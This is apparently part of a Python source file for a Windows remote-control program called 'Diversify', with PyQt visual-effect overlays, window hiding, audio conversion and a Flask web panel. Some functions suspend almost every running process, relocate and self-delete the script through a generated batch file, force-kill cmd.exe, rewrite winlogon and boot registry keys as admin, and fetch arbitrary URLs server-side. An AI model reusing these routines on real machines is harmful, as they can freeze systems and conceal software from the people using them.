            self.draw_rain(painter)
        elif self.current_effect == "lightning":
            self.draw_lightning(painter)
        elif self.current_effect == "matrix":
            self.draw_matrix(painter)
        elif self.current_effect == "particles":
            self.draw_particles(painter)
        elif self.current_effect == "binary":
            self.draw_binary(painter)
        elif self.current_effect == "vortex":
            self.draw_vortex(painter)
        elif self.current_effect == "cosmic":
            self.draw_cosmic(painter)
        elif self.current_effect == "psychedelic":
            self.draw_psychedelic(painter)
        elif self.current_effect == "quantum_particles":
            self.draw_quantum_particles(painter)
        elif self.current_effect == "void_portals":
            self.draw_void_portals(painter)
        elif self.current_effect == "reality_fractures":
            self.draw_reality_fractures(painter)
        elif self.current_effect == "time_ripples":
            self.draw_time_ripples(painter)
        elif self.current_effect == "dna_helix":
            self.draw_dna_helix(painter)
        elif self.current_effect == "dimensional_tears":
            self.draw_dimensional_tears(painter)
        elif self.current_effect == "energy":
            self.draw_energy_field(painter)

    # -------------------------------------------------------------------------
    #   DRAWING
    # -------------------------------------------------------------------------
    def draw_rain(self, painter):
        # Draw drops
        painter.setPen(QPen(QColor(100, 100, 255, 200), 2))
        for drop in self.rain_drops:
            painter.drawLine(QPointF(drop['x'], drop['y']),
                            QPointF(drop['x'], drop['y'] + 15))

        # Draw splashes
        painter.setPen(Qt.NoPen)
        for splash in self.rain_splashes:
            rg = QRadialGradient(QPointF(splash['x'], splash['y']), splash['radius'])
            c = QColor(100, 100, 255, splash['alpha'])
            rg.setColorAt(0, c)
            c2 = QColor(c)
            c2.setAlpha(0)
            rg.setColorAt(1, c2)
            painter.setBrush(rg)
            painter.drawEllipse(QPointF(splash['x'], splash['y']),
                                splash['radius'], splash['radius'])


    def draw_lightning(self, painter):
        if not self.tree_lightning_mode:
            if not self.lightning_points:
                return
            c = QColor(255, 255, 255, self.lightning_alpha)
            pen = QPen(c, 2)
            painter.setPen(pen)
            for i in range(len(self.lightning_points) - 1):
                x1, y1 = self.lightning_points[i]
                x2, y2 = self.lightning_points[i + 1]
                painter.drawLine(QPointF(int(x1), int(y1)), QPointF(int(x2), int(y2)))
        else:
            now = time.time()
            if (now - self.lightning_start_time) < 0.3 and self.lightning_flash_color:
                painter.fillRect(self.rect(), self.lightning_flash_color)

            if not self.lightning_tree_segments:
                return  # Nothing to draw

            c = QColor(255, 255, 255, self.lightning_alpha)
            pen = QPen(c, 2)
            painter.setPen(pen)

            revealed = getattr(self, 'num_revealed_segments', 0)
            total_segments = len(self.lightning_tree_segments)
            revealed = min(revealed, total_segments)

            # logging.debug(f"Drawing lightning: {revealed}/{total_segments} segments.")

            for i in range(revealed):
                if i >= total_segments:
                    # logging.error(f"Attempted to access segment {i}, but only {total_segments} segments exist.")
                    break
                seg = self.lightning_tree_segments[i]
                if len(seg) != 4:
                    # logging.error(f"Invalid segment format: {seg}")
                    continue
                x1, y1, x2, y2 = seg
                painter.drawLine(QPointF(int(x1), int(y1)), QPointF(int(x2), int(y2)))



    def draw_matrix(self, painter):
        painter.setFont(QFont('Courier New', 14))
        for stream in self.matrix_chars:
            for i in range(stream['length']):
                ch_y = stream['y'] - i * 20
                if 0 <= ch_y <= self.height():
                    if i == 0:
                        painter.setPen(QColor(255, 255, 255, 200))
                    else:
                        alpha = 200 - i * 15
                        painter.setPen(QColor(0, 255, 0, max(0, alpha)))
                    if random.random() < 0.04:
                        stream['chars'][i] = chr(random.randint(0x30A0, 0x30FF))
                    painter.drawText(QP(int(stream['x']), int(ch_y)), stream['chars'][i])

    def draw_particles(self, painter):
        painter.setPen(Qt.NoPen)
        for p in self.particles:
            painter.setBrush(p['color'])
            painter.drawEllipse(QP(int(p['x']), int(p['y'])), int(p['size']), int(p['size']))

    def draw_binary(self, painter):
        painter.setFont(QFont('Courier New', 12))
        for s in self.binary_streams:
            for i in range(s['length']):
                ch_y = s['y'] - i * 15
                if 0 <= ch_y <= self.height():
                    painter.setPen(QColor(0, 255, 0, 180))
                    painter.drawText(QP(int(s['x']), int(ch_y)), str(random.randint(0, 1)))

    def draw_vortex(self, painter):
        painter.setPen(Qt.NoPen)
        cx = self.width() // 2
        cy = self.height() // 2
        for v in self.vortex_particles:
            x = cx + math.cos(v['angle']) * v['radius']
            y = cy + math.sin(v['angle']) * v['radius']
            c = QColor(v['color'])
            painter.setBrush(c)
            painter.drawEllipse(QP(int(x), int(y)), int(v['size']), int(v['size']))

    def draw_cosmic(self, painter):
        painter.setPen(Qt.NoPen)
        # stars
        for s in self.stars:
            # twinkle
            val = math.sin(s['phase'])
            s_alpha = int((val * 0.5 + 0.5) * 255)
            col = QColor(255, 255, 255, s_alpha)
            painter.setBrush(col)
            painter.drawEllipse(QP(int(s['x']), int(s['y'])), int(s['size']), int(s['size']))
        # nebulas
        for nb in self.nebulas:
            rg = QRadialGradient(QPointF(nb['x'], nb['y']), nb['size'])
            co = QColor(nb['color'])
            alpha_ = int(255 * nb['alpha'])
            co.setAlpha(alpha_)
            rg.setColorAt(0, co)
            co2 = QColor(co)
            co2.setAlpha(0)
            rg.setColorAt(1, co2)
            painter.setBrush(rg)
            painter.drawEllipse(QPointF(nb['x'], nb['y']), nb['size'], nb['size'])

    def draw_psychedelic(self, painter):
        block = 20
        painter.setPen(Qt.NoPen)
        for xx in range(0, self.width(), block):
            for yy in range(0, self.height(), block):
                val = math.sin(xx * 0.02 + self.psychedelic_offset) + math.cos(yy * 0.02 + self.psychedelic_offset)
                col = self.get_rainbow_color((val + 2) / 4)
                col.setAlpha(120)
                painter.setBrush(col)
                painter.drawRect(xx, yy, block, block)

    def draw_quantum_particles(self, painter):
        painter.setPen(Qt.NoPen)
        for p in self.quantum_particles:
            radius = 10 + math.sin(p['wave_phase']) * p['amplitude']
            cc = QColor(p['color'])
            cc.setAlpha(70)
            painter.setBrush(cc)
            painter.drawEllipse(p['pos'], radius, radius)
            if p['entangled_partner']:
                e = p['entangled_partner']
                grad = QLinearGradient(p['pos'], e['pos'])
                grad.setColorAt(0, p['color'])
                grad.setColorAt(1, e['color'])
                pen = QPen(QBrush(grad), 1, Qt.DashLine)
                painter.setPen(pen)
                painter.drawLine(p['pos'], e['pos'])
                painter.setPen(Qt.NoPen)

    def draw_void_portals(self, painter):
        painter.setPen(Qt.NoPen)
        for portal in self.void_portals:
            rad = QRadialGradient(portal['center'], portal['radius'])
            rad.setColorAt(0, QColor(0, 0, 0, 220))
            rad.setColorAt(1, QColor(0, 0, 0, 0))
            painter.setBrush(rad)
            painter.drawEllipse(portal['center'], portal['radius'], portal['radius'])
            # swirl
            for pt in portal['particles']:
                angle = pt['angle'] + portal['rotation']
                dist = pt['distance']
                x = portal['center'].x() + math.cos(angle * portal['distortion']) * dist
                y = portal['center'].y() + math.sin(angle * portal['distortion']) * dist
                color = QColor(200, 0, 255, 150)
                painter.setBrush(color)
                painter.drawEllipse(QPointF(x, y), pt['size'], pt['size'])

    def draw_reality_fractures(self, painter):
        for frac in self.fractures:
            path = QPainterPath()
            path.moveTo(frac['points'][0])
            for p2 in frac['points'][1:]:
                path.lineTo(p2)
            for i in range(4):
                c = QColor(frac['color'])
                alpha_ = int(120 * frac['glow_intensity'] / (i + 1))
                c.setAlpha(alpha_)
                pen = QPen(c, frac['width'] + i * 2)
                painter.setPen(pen)
                painter.drawPath(path)

    def draw_time_ripples(self, painter):
        painter.setPen(Qt.NoPen)
        for r in self.time_ripples:
            rg = QRadialGradient(r['center'], r['radius'])
            c = QColor(0, 255, 255, r['alpha'])
            rg.setColorAt(0, c)
            c2 = QColor(c)
            c2.setAlpha(0)
            rg.setColorAt(1, c2)
            painter.setBrush(rg)
            painter.drawEllipse(r['center'], r['radius'], r['radius'])

    def draw_dna_helix(self, painter):
        painter.setPen(Qt.NoPen)
        center_x = self.width() * 0.5
        base_y = (self.height() // 2) - 200
        amplitude = 120
        for strand_i, strand_data in enumerate(self.dna_strands):
            prev_pt = None
            for point in strand_data:
                x = center_x + math.cos(point['phase']) * amplitude
                y = base_y + point['base_y']
                this_pt = QPointF(x, y)
                # connect with line
                if prev_pt is not None:
                    pen = QPen(point['color'], 3)
                    painter.setPen(pen)
                    painter.drawLine(prev_pt, this_pt)
                    painter.setPen(Qt.NoPen)
                # draw circle
                painter.setBrush(point['color'])
                painter.drawEllipse(this_pt, 4, 4)
                prev_pt = this_pt

    def draw_dimensional_tears(self, painter):
        for tear in self.tears:
            path = QPainterPath()
            path.moveTo(tear['points'][0])
            for pt2 in tear['points'][1:]:
                path.lineTo(pt2)
            for i in range(3):
                c = QColor(tear['color'])
                c.setAlpha(120 - i * 30)
                pen = QPen(c, tear['width'] + i * 2, Qt.SolidLine, Qt.RoundCap)
                painter.setPen(pen)
                painter.drawPath(path)

    def draw_energy_field(self, painter):
        # connections
        for conn in self.energy_connections:
            n1 = conn['node1']
            n2 = conn['node2']
            gradient = QLinearGradient(n1['pos'], n2['pos'])
            if n1['charge'] == n2['charge']:
                c1 = QColor(64, 64, 255, int(255 * conn['strength']))
                c2 = QColor(128, 128, 255, 0)
            else:
                c1 = QColor(255, 64, 64, int(255 * conn['strength']))
                c2 = QColor(255, 128, 128, 0)
            gradient.setColorAt(0, c1)
            gradient.setColorAt(1, c2)
            pen = QPen(QBrush(gradient), 2)
            painter.setPen(pen)
            painter.drawLine(n1['pos'], n2['pos'])
        # nodes
        painter.setPen(Qt.NoPen)
        for node in self.energy_nodes:
            radius = 25
            grad = QRadialGradient(node['pos'], radius)
            if node['charge'] > 0:
                base_color = QColor(64, 64, 255)
            else:
                base_color = QColor(255, 64, 64)
            glow_c = QColor(base_color)
            glow_c.setAlpha(int(150 * node['energy']))
            grad.setColorAt(0, glow_c)
            grad.setColorAt(1, QColor(0, 0, 0, 0))
            painter.setBrush(grad)
            painter.drawEllipse(node['pos'], radius, radius)
            # core
            painter.setBrush(base_color)
            painter.drawEllipse(node['pos'], 6, 6)

    # -------------------------------------------------------------------------
    #   UTIL
    # -------------------------------------------------------------------------
    def get_rainbow_color(self, pos):
        hue = pos % 1.0
        r, g, b = colorsys.hsv_to_rgb(hue, 1, 1)
        return QColor(int(r * 255), int(g * 255), int(b * 255))
  

# We'll store a global reference so other threads can call it:
overlay_instance = None

def run_overlay_app():
    """Run the PyQt AllEffectsOverlay in its own event loop."""
    global overlay_instance
    
    # We must create a QApplication in this thread:
    app = QApplication(sys.argv)
    
    # Create the overlay
    overlay_instance = AllEffectsOverlay() 
    # overlay_instance.show()  # If you want to forcibly show. AllEffectsOverlay might do it in init
    
    # Start the event loop in this thread
    app.exec_()

def start_overlay_background():
    """
    Start the overlay in a background thread. 
    Returns immediately; the overlay remains alive in that thread.
    """
    t = threading.Thread(target=run_overlay_app, daemon=True)
    t.start()
    
    # We'll wait a tiny moment for overlay_instance to get set
    time.sleep(0.5)
    return t

if __name__ == '__main__':
    overlay_thread = start_overlay_background()

def set_effect(effect_name):
    """
    Safely set an effect. 
    Must be called from ANY thread, but we handle the call in the overlay's thread.
    """
    global overlay_instance
    if overlay_instance is not None:
        # Just call directly (non-thread-safe). 
        # If issues arise, consider using QMetaObject.invokeMethod(…).
        overlay_instance.set_effect(effect_name)
    else:
        print("Overlay not started yet. Can't set effect.")

def clear_effect():
    """Clear effect from anywhere."""
    global overlay_instance
    if overlay_instance is not None:
        overlay_instance.clear_effect()
    else:
        print("Overlay not started yet. Can't clear effect.")
  
def show_process_via_name(name):
     # Initialize COM for this thread
    pythoncom.CoInitialize()

    def enum_windows_callback(hwnd, result):
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            process = psutil.Process(pid)
            if process.name().lower() == name.lower():
                title = win32gui.GetWindowText(hwnd)
                if title:  # Only include windows with a title
                    result.append((hwnd, title))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
        return True

    try:
        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)

        if not windows:
            print(f"No windows found for process: {name}")
            return

        shell = win32com.client.Dispatch("Shell.Application")

        for hwnd, title in windows:
            try:
                print(f"Attempting to show window: '{title}' (handle: {hwnd})")

                # Make the window visible first
                win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
                
                # Try to restore the window if it's minimized
                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                
                # Bring the window to the foreground
                win32gui.SetForegroundWindow(hwnd)
                
                win32gui.SetForegroundWindow(hwnd)
                
                print(f"Successfully showed window: '{title}' (handle: {hwnd})")
            except Exception as e:
                print(f"Error showing window '{title}' (handle: {hwnd}): {str(e)}")

        print("Finished attempting to show hidden windows.")

    finally:
        # Uninitialize COM when we're done
        pythoncom.CoUninitialize()

# def show_process_via_pid(pid):
#     """Shows a process from background by its PID."""
#     hwnds = get_hwnds_for_pid(pid)
#     for hwnd in hwnds:
#         # Make the window visible first
#             win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
            
#             # Try to restore the window if it's minimized
#             win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
            
#             # Bring the window to the foreground
#             win32gui.SetForegroundWindow(hwnd)
            
 
#             win32gui.SetForegroundWindow(hwnd)
 
# def show_process_via_name(name):
#     """Shows a process from background by its name."""
#     pids = get_pids_for_process_name(name)
#     for pid in pids:
#         show_process_via_pid(pid)
    
def maximize_process_via_pid(pid):
    """Maximizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)    

def maximize_process_via_name(name):
    """Maximizes a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        maximize_process_via_pid(pid)
    
def minimize_process_via_pid(pid):
    """Minimizes a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_FORCEMINIMIZE)
    
def minimize_process_via_name(name):
    """Minimizes a process by its name."""
    pids = get_pids_for_process_name(name)
    for pid in pids:
        minimize_process_via_pid(pid)

def hide_process_via_pid(pid):
    """Hides a process by its PID."""
    hwnds = get_hwnds_for_pid(pid)
    for hwnd in hwnds:
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        
def get_process_name_from_pid(pid):
    """Returns the process name for a given PID.""" 
    return psutil.Process(pid).name()

def get_parent_process_name_from_pid(pid):
    """Returns the parent process name for a given PID."""
    return psutil.Process(pid).parent().name()

def get_own_parent_process_pid():
    """Returns the PID of the parent process."""
    return os.getppid()

def freeze_all_processes():
    """Freezes all processes except for essential system processes."""
    pids_tocheck = get_process_connected_pids(get_own_parent_process_pid())
    tonotfreeze = [
        "System", "OpenConsole.exe", "MemCompression", "wlms.exe", 'svchost.exe', 
        'dwm.exe', 'MsMpEng.exe', 'fontdrvhost.exe', 'Registry', 'TrustedInstaller.exe', 
        'NisSrv.exe', 'wininit.exe', 'StartMenuExperienceHost.exe', 
        'System Idle Process', 'conhost.exe', 'SearchProtocolHost.exe', 
        'SearchIndexer.exe','System','services.exe', 'taskkill.exe'
    ]
    pids = []
    for process in psutil.process_iter():
        try:
            if process.name() in tonotfreeze:
                pids.append(process.pid)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            print(f'Error while freezing: {e}')
    pids_tocheck.extend(pids)

    for i in psutil.process_iter():
        try:
            if i.pid in pids_tocheck:
                continue
            print(f'Suspending {i.name()}')
            i.suspend()
        except:
            pass
        
def unfreeze_all_processes():
    """Unfreezes all processes."""
    for i in psutil.process_iter():
        try:
            i.resume()
        except:
            pass


# def convert_mp4_to_wav_pyav(src_path, dst_path): # ren fixed
#     """
#     Extracts the audio track from an MP4 file and saves it as a WAV file with improved quality.

#     Args:
#         src_path (str): Path to the source MP4 file.
#         dst_path (str): Path where the WAV file will be saved.
#     """
#     try:
#         # Open the source file
#         container = av.open(src_path)
        
#         # Find the audio stream
#         audio_stream = None
#         for stream in container.streams:
#             if stream.type == 'audio':
#                 audio_stream = stream
#                 break
        
#         if audio_stream is None:
#             raise ValueError("No audio stream found in the MP4 file.")
        
#         # Target audio parameters for high quality
#         target_sample_rate = 48000  # High quality sample rate
#         target_layout = 'stereo'  # Force stereo output
        
#         # Configure the stream
#         audio_stream.codec_context.sample_rate = target_sample_rate
#         audio_stream.codec_context.layout = target_layout
        
#         # Initialize resampler
#         resampler = av.AudioResampler(
#             format=av.AudioFormat('s16').packed,
#             layout=target_layout,
#             rate=target_sample_rate
#         )
        
#         # Open WAV file
#         with wave.open(dst_path, 'wb') as wav_file:
#             wav_file.setnchannels(2)  # Stereo
#             wav_file.setsampwidth(2)  # 16-bit depth
#             wav_file.setframerate(target_sample_rate)
            
#             # Decode and write audio frames
#             for frame in container.decode(audio_stream):
#                 # Resample frame
#                 resampled_frames = resampler.resample(frame)
#                 for resampled in resampled_frames:
#                     # Convert to numpy array with improved precision
#                     samples = resampled.to_ndarray()
                    
#                     # Normalize audio levels
#                     if samples.dtype == np.float32:
#                         samples = np.clip(samples, -1.0, 1.0)
#                         samples = (samples * 32767).astype(np.int16)
#                     else:
#                         samples = samples.astype(np.int16)
                    
#                     # Write frames
#                     wav_file.writeframes(samples.tobytes())
        
#         # Close the container
#         container.close()
        
#         print(f"Successfully converted '{src_path}' to '{dst_path}'.")
#         return True, "Conversion successful."
    
#     except Exception as e:
#         print(f"Error converting '{src_path}' to WAV: {e}")
#         return False, str(e)

# MODIFY IN: hwstt.py
# LOCATION: Find the definition of `convert_mp4_to_wav_pyav_multiprocess`
# REPLACE: The existing function definition with this updated version
# DESCRIPTION: Removed multiprocessing, renamed for futures compatibility


def convert_mp4_to_wav_pyav_future(src_path, dst_path): # RENAMED, and removed multiprocessing
    """Extracts the audio track from an MP4 file and saves it as a WAV file with improved quality."""
    try: # ADDED try block here, fr fr
        # Open the source file
        container = av.open(src_path)

        # Find the audio stream
        audio_stream = None
        for stream in container.streams:
            if stream.type == 'audio':
                audio_stream = stream
                break

        if audio_stream is None:
            raise ValueError("No audio stream found in the MP4 file.")

        # Target audio parameters for high quality
        target_sample_rate = 48000  # High quality sample rate
        target_layout = 'stereo'  # Force stereo output

        # Configure the stream
        audio_stream.codec_context.sample_rate = target_sample_rate
        audio_stream.codec_context.layout = target_layout

        # Initialize resampler
        resampler = av.AudioResampler(
            format=av.AudioFormat('s16').packed,
            layout=target_layout,
            rate=target_sample_rate
        )

        # Open WAV file
        with wave.open(dst_path, 'wb') as wav_file:
            wav_file.setnchannels(2)  # Stereo
            wav_file.setsampwidth(2)  # 16-bit depth
            wav_file.setframerate(target_sample_rate)

            # Decode and write audio frames
            for frame in container.decode(audio_stream):
                # Resample frame
                resampled_frames = resampler.resample(frame)
                for resampled in resampled_frames:
                    # Convert to numpy array with improved precision
                    samples = resampled.to_ndarray()

                    # Normalize audio levels
                    if samples.dtype == np.float32:
                        samples = np.clip(samples, -1.0, 1.0)
                        samples = (samples * 32767).astype(np.int16)
                    else:
                        samples = samples.astype(np.int16)

                    # Write frames
                    wav_file.writeframes(samples.tobytes())

        # Close the container
        container.close()

        print(f"Successfully converted '{src_path}' to '{dst_path}'.")
        return True, "Conversion successful."

    except Exception as e: # ADDED except block here, fr fr
        error_message = f"Error converting '{src_path}' to WAV in child process: {e}" # more specific error msg
        print(error_message) # still print in child process for child logs if needed
        return False, error_message # return error message to parent process


# MODIFY IN: hwstt.py
# LOCATION: Find the definition of `convert_mp4_to_wav_task`
# REPLACE: The existing function definition with this super-debugged version
# DESCRIPTION: Added LOTS of debug prints INSIDE the decoding loop and specific av exception handling

# MODIFY IN: hwstt.py
# LOCATION: Find the definition of `convert_mp4_to_wav_task`
# REPLACE: The existing function definition with this super-debugged and queue-messaging version
# DESCRIPTION:  Now uses result_queue to send DEBUG messages back to the parent process for visibility in console


 

def convert_mp4_to_wav_pyav_multiprocess(src_path, dst_path):
    """
    Runs the MP4 to WAV conversion in a separate process.

    Args:
        src_path (str): Path to source MP4 file
        dst_path (str): Path to save WAV file

    Returns:
        tuple: (success:bool, message:str)
    """
    try:
        # Create a process to run the conversion
        process = multiprocessing.Process(
            target=mp4_to_wav_converter,
            args=(src_path, dst_path)
        )
        
        # Start the process
        process.start()
        print(f"Conversion process started for '{src_path}' to '{dst_path}'")
        # Wait for completion with timeout
        process.join()  # 60 second timeout
        
        # Check if process completed successfully
        if process.is_alive():
            process.terminate()
            process.join()
            return False, "Conversion timed out"
            
        if process.exitcode == 0:
            return True, "Conversion successful"
        else:
            return False, "Conversion failed"
            
    except Exception as e:
        return False, f"Error starting conversion process: {str(e)}"
    
    
def restart_self():
    """Restarts the script."""
    runcmd(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
    runcmd('taskkill /f /im cmd.exe', retry=3) 
    kill_self()

def moveToFolder(ToWhere="Random"):
    """Moves the script to a specified folder."""
    if ToWhere.casefold() == "Random".casefold():
        ToWhere = get_random_folder()
    if " " in ToWhere:
        ToWhere = get_random_folder()
        while " " in ToWhere:
            ToWhere = get_random_folder()
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.cmd'
    cmd_content = f"""
ping 127.0.0.1 -n 3 > nul
TASKKILL /F /T /PID {os.getpid()}
ping 127.0.0.1 -n 1 > nul
robocopy "{get_script_directory()}" "{ToWhere}" "{get_script_filename()}" /Z
ping 127.0.0.1 -n 1 > nul
del /f /q "{os.path.join(get_script_directory(), get_script_filename())}"
start cmd /k \"{os.path.join(ToWhere, get_script_filename())} delFile {os.path.join(get_script_directory(), random_string)} ren\"
    """
    with open(os.path.join(get_script_directory(), random_string), "w") as cmd_file:
        cmd_file.write(cmd_content)
    runcmd("start " + os.path.join(get_script_directory(), random_string))
    kill_self()

def is_system_user():
    """Checks if the script is running as the SYSTEM user."""
    token_info = ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 2, 1)
    sid_type = ctypes.c_ubyte()
    sid_size = ctypes.c_ulong(0)
    sid_data = ctypes.create_string_buffer(sid_size.value) 
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), 0, ctypes.byref(sid_size))
    sid_size = ctypes.c_ulong(sid_size.value)
    ctypes.windll.advapi32.GetTokenInformation(token_info, 1, ctypes.byref(sid_data), sid_size, ctypes.byref(sid_size))
    ctypes.windll.advapi32.GetSidSubAuthorityCount(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)))
    ctypes.windll.advapi32.GetSidSubAuthority(ctypes.cast(sid_data, ctypes.POINTER(ctypes.c_void_p)), 1)
    return sid_type.value == 18

def disableUWF():
    """Disables the Unified Write Filter."""
    # run_command_as_admin('DISM /online /disable-feature /featurename:Client-UnifiedWriteFilter')
    # run_command_as_admin('uwfmgr.exe filter disable')
    # runcmd('shutdown.exe /g /t 0')
  
    run_command_as_admin('reg delete "HKLM\SYSTEM\CurrentControlSet\Control" /v BootVerificationProgram /f')

    run_command_as_admin('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *" /f')

    run_command_as_admin('reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SetupExecute /f')
    run_command_as_admin('reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v Execute /f')

    run_command_as_admin(r'reg add "HKLM\SOFTWARE\\Microsoft\Windows NT\\CurrentVersion\winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\\userinit.exe" /f')
    run_command_as_admin(r'reg add "HKLM\SOFTWARE\\Microsoft\Windows NT\\CurrentVersion\winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f')
    run_command_as_admin(r'reg add "HKLM\SOFTWARE\\Microsoft\Windows NT\\CurrentVersion\winlogon" /v VMApplet /t REG_SZ /d "SystemPropertiesPerformance.exe /pagefile" /f')

    run_command_as_admin(r'reg delete "HKLM\SOFTWARE\\Microsoft\Windows\\CurrentVersion" /v RunServicesOnce /f')
    run_command_as_admin(r'reg delete "HKLM\SOFTWARE\\Microsoft\Windows\\CurrentVersion" /v RunServices /f')

def enableUWF():
    """Enables the Unified Write Filter."""
    # run_command_as_admin('DISM /online /enable-feature /featurename:Client-UnifiedWriteFilter')
    # run_command_as_admin('uwfmgr.exe filter enable')
    # runcmd('shutdown.exe /g /t 0')
    pass
  

 
def websiteUI():
    """Runs a Flask web UI for controlling Diversify."""
    print(f'Initializing UI...')
    
    thread_scan_network = None
    last_response_from_clientUI = None
    newresponse = None
    geolocator = Photon(user_agent="myGeocoder", timeout=10, proxies={"http": None, "https": None})
    currentSelectedIPV4 = None
    pending_responses = {}
    client_connected_events = {}
    clients = {}
    client_requests = {}
    value_responses = {}
    pending_value_requests = {}

    app = Flask(__name__, static_folder='./')
    
    app.config['SECRET_KEY'] = secrets.token_hex(32)
    app.config['PERMANENT_SESSION_LIFETIME'] = 3600
    
    socketio = SocketIO(
        app, 
        async_mode='gevent',
        ping_timeout=20,  # Increased timeout
        ping_interval=10,  # Increased interval
        max_http_buffer_size=1024 * 1024,
        cors_allowed_origins="*",
        logger=False,
        engineio_logger=False
    )

    
    active_sessions = {}
    socket_sessions = {}
    
    def is_session_valid():
        """Check if current session is valid without redirecting."""
        try:
            client_id = request.remote_addr
            session_id = session.get('session_id')
            
            if not session.get('authenticated'):
                return False
                
            if (not session_id or 
                session_id not in active_sessions or 
                time.time() - active_sessions[session_id]['validated_at'] >= 3600):
                return False
                
            if prioritizeipv4 and client_id not in prioritizeipv4:
                return False
                
            return True
        except Exception as e:
            print(f"Session validation error: {e}")
            return False

    def requires_auth(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not is_session_valid():
                session.clear()
                return redirect(url_for('login'))
            return f(*args, **kwargs)
        return decorated

    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle client disconnections"""
        client_id = request.remote_addr
        if client_id in clients:
            del clients[client_id]
        print(f"Client {client_id} disconnected")

    def safe_disconnect():
        """Safely handle disconnection without raising errors."""
        try:
            if hasattr(request, 'sid'):
                socket_id = request.sid
                if socket_id in socket_sessions:
                    del socket_sessions[socket_id]
            disconnect()
        except Exception as e:
            print(f"Safe disconnect error: {e}")

    @app.before_request
    def before_request_handler():
            """Forces authentication before each request."""
            if request.endpoint != 'login' and not is_session_valid():
                session.clear()
                return redirect(url_for('login'))

    # @socketio.on('connect')
    # def handle_connect():
    #     """Handle new socket connections with error handling."""
    #     try:
    #         client_id = request.remote_addr
    #         session_id = session.get('session_id')
            
    #         # For WebSocket connections, we'll be more lenient
    #         # Only disconnect if there's no valid session at all
    #         if not session.get('authenticated'):
    #             safe_disconnect()
    #             return False
            
    #         # Store socket session even if the session might expire soon
    #         socket_sessions[request.sid] = {
    #             'client_id': client_id,
    #             'session_id': session_id,
    #             'connected_at': time.time()
    #         }
            
    #         # Update active session if it exists
    #         if session_id in active_sessions:
    #             active_sessions[session_id]['socket_id'] = request.sid
            
    #         # print(f"Client connected: {client_id} (SID: {request.sid})")
    #         emit('connection_established', {'status': 'connected'})
            
    #         # Emit session status so client knows when to redirect
    #         remaining_time = 0
    #         if session_id in active_sessions:
    #             remaining_time = 3600 - (time.time() - active_sessions[session_id]['validated_at'])
            
    #         emit('session_status', {
    #             'valid': is_session_valid(),
    #             'remaining_time': int(remaining_time)
    #         })
            
    #         clients[client_id] = request.sid
    #         # print(f"Client {client_id} connected with session {request.sid}")
            
    #         return True
            
    #     except Exception as e:
    #         print(f"Connection error: {e}")
    #         return False

    def send_message_to_client(client_id, message_type, data):
        """Safely send message to client."""
        try:
            socket_id = None
            for sid, info in socket_sessions.items():
                if info['client_id'] == client_id:
                    socket_id = sid
                    break
            
            if socket_id:
                # Check if session is still valid before sending
                session_id = socket_sessions[socket_id]['session_id']
                if session_id in active_sessions:
                    socketio.emit(message_type, data, room=socket_id)
                    return True
            return False
        except Exception as e:
            print(f"Error sending message to client {client_id}: {e}")
            return False


    # ADD TO: hwstt.py
# LOCATION: Inside `/list_soundboard_files` route.
# DESCRIPTION: Adding debug info in server


    @app.route('/play_external_sound', methods=['POST'])
    def play_external_sound():
        """
        Receives a JSON or form with 'url' for an external audio file.
        - Checks file size (< 10MB)
        - Checks duration (< ~90s)
        - If valid, queue it for playback (like any normal sound).
        """

        try:
            audio_url = request.form.get('url')  # or request.json.get('url') if JSON
            if not audio_url:
                return jsonify({'error': 'No URL provided'}), 400

            # HEAD request to check size
            head_resp = requests.head(audio_url, allow_redirects=True, timeout=10)
            content_length = head_resp.headers.get('Content-Length')
            if content_length is None:
                # Some servers might not provide it, then we do a manual partial download or skip
                pass
            else:
                size_in_bytes = int(content_length)
                if size_in_bytes > 10 * 1024 * 1024:  # 10MB
                    return jsonify({'error': 'File exceeds 10MB limit'}), 400

            # Now let's download fully
            resp = requests.get(audio_url, stream=True, timeout=15)
            resp.raise_for_status()

            # Save to temp file
            with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as tmp_file:
                for chunk in resp.iter_content(chunk_size=8192):
                    tmp_file.write(chunk)
                tmp_path = tmp_file.name

            # Check duration with pydub
            try:
                audio_seg = AudioSegment.from_file(tmp_path)
                duration_sec = audio_seg.duration_seconds
                if duration_sec > 90:  # 1.5 minutes
                    os.remove(tmp_path)
                    return jsonify({'error': 'Audio is longer than 90 seconds'}), 400

            except Exception as e:
                os.remove(tmp_path)
                return jsonify({'error': f'Error reading audio file: {str(e)}'}), 400

            # If we pass checks, queue it
            success, msg = _queue_external_sound(tmp_path)  # see below
            if success:
                return jsonify({'message': 'Sound queued for playback'}), 200
            else:
                os.remove(tmp_path)  # if queueing fails
                return jsonify({'error': msg}), 400

        except Exception as e:
            print(f"Error in /play_external_sound: {e}")
            return jsonify({'error': str(e)}), 500


    def _queue_external_sound(temp_path):
        """
